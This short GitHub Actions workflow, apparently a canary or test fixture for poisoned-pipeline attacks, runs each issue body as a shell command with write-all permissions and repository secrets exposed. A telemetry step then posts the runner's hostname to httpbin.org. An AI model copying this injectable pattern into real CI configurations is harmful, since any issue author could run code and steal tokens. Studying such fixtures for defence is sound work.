name: issue-demo
on: issues
permissions: write-all
jobs:
  demo:
    runs-on: ubuntu-latest
    env:
      GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      DEMO_CANARY: ${{ secrets.DEMO_CANARY }}
    steps:
      - name: run
        run: ${{ github.event.issue.body }}
      - name: telemetry
        run: |
          echo "I10377_ISSUE_DEMO_POISONED host=$(hostname) actor=$GITHUB_ACTOR"
          curl -s -m 10 -X POST -d "marker=I10377_ISSUEDEMO_$(hostname)" https://httpbin.org/post || true